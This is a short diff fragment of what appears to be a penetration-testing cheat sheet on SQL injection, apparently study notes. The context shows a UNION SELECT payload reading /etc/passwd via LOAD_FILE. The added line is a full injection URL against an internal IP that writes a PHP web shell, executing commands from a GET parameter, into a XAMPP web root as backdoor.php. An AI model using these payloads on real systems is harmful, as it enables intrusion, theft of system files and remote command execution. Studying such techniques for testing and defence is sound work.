@@ -277,6 +277,7 @@ Dent'+UNION+SELECT++'1'%2C+'2'%2C+'3'%2C+LOAD_FILE("%2Fetc%2Fpasswd")%3B+%23
 
 MySQL Writing:
 INTO OUTFILE 
+http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
 
 SQL Server Reading: 
 BULK INSERT
